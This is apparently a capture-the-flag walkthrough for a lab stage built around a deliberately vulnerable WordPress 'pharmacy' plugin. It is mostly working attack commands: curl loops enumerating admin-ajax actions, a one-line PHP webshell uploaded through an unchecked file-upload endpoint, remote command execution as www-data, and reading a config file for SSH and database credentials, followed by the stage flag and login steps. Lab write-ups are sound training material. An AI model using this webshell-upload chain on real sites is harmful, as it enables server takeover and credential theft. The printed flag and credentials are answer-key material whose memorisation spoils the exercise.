# CTF Stage 4: WordPress RCE - Quick Walkthrough

**Objective**: Exploit hidden AJAX endpoints → achieve RCE → extract Stage 5 credentials  
**Flag**: `CTF{PHARMACY_STAGE5_RCE_EXPLOITATION_SUCCESS}`  
**Time Estimate**: 15-30 minutes

## Quick Start

---

## Exploitation Steps

### 1️⃣ Reconnaissance - Find Hints
```bash
curl -s http://localhost | grep -i "hint"
```
**Output should show**: "Find the vulnerable plugin → Exploit AJAX endpoint → Achieve RCE → Extract credentials"

### 2️⃣ Enumerate AJAX Endpoints
```bash
# Test pharmacy-related actions
for action in pharmacy_export pharmacy_sync pharmacy_data pharmacy_upload; do
  curl -s -X POST "http://localhost/wp-admin/admin-ajax.php?action=$action" -d "test=1"
  echo ""
done
```
**Look for**: Responses like `{"success":false,"data":"No file provided"}` (endpoint exists!)

✅ **Found**: `pharmacy_export` and `pharmacy_sync` endpoints

### 3️⃣ Upload PHP Webshell
```bash
# Create shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Upload via pharmacy_export
curl -s -X POST -F "export_file=@/tmp/shell.php" \
  "http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export" | jq .
```

**Expected Response**:
```json
{"success":true,"data":{"url":"http://localhost/wp-content/uploads/pharmacy/shell.php"}}
```

### 4️⃣ Achieve RCE
```bash
# Test RCE
curl -s "http://localhost/wp-content/uploads/pharmacy/shell.php?cmd=id"
```

**Success Output**: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### 5️⃣ Extract Stage 5 Credentials
```bash
# Get config file
curl -s "http://localhost/wp-content/uploads/pharmacy/shell.php?cmd=cat%20/var/www/html/wp-content/pharmacy_config.php"
```

**You'll get**:
```php
define('STAGE5_SSH_HOST', 'stage5.internal.pharmacy.local');
define('STAGE5_SSH_USER', 'pharmacy_admin');
define('STAGE5_SSH_PASS', 'PharmacyPass_2025');
define('DB_BACKUP_HOST', 'db.internal.pharmacy.local');
define('DB_BACKUP_USER', 'db_admin');
define('DB_BACKUP_PASS', 'DatabaseAdmin@2025');
define('STAGE5_FLAG', 'CTF{PHARMACY_STAGE5_RCE_EXPLOITATION_SUCCESS}');
```

---

## Stage 4 Complete! 🎉

**Flag**: `CTF{PHARMACY_STAGE5_RCE_EXPLOITATION_SUCCESS}`

**Credentials Obtained**:
- SSH: pharmacy_admin / PharmacyPass_2025 @ stage5.internal.pharmacy.local
- DB: db_admin / DatabaseAdmin@2025 @ db.internal.pharmacy.local

---

## Stage 5 - Connect & Progress

### SSH Connection
```bash
ssh pharmacy_admin@stage5.internal.pharmacy.local
# Password: PharmacyPass_2025
```

### Access Database
```bash
mysql -u db_admin -h db.internal.pharmacy.local
# Password: DatabaseAdmin@2025
```

---

**Created for CTF Team Testing - April 18, 2026**
**Made By: Omar Al Sheikh Khalil**
